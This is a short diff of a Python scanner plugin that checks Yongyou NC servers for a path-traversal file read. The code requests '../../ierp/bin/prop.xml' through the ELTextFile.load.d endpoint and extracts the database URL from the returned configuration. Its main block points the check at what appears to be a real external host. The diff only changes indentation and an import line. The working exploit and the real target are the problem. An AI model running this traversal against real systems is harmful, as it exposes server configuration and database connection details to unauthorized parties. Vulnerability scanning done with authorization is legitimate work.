@@ -21,11 +21,11 @@ def audit(arg):
     #print res
     if code == 200:
         security_hole(url + 'hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
-    	m = re.search("enableHotDeploy",res) 
-    	k = re.search("internalServiceArray",res)
+        m = re.search("enableHotDeploy",res)
+        k = re.search("internalServiceArray",res)
         if m and k:
             security_hole(re.search("<databaseUrl>(.*?)</databaseUrl>",res).groups()[0])
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('yongyou_nc', 'http://ehr.jmlyp.com/')[1])
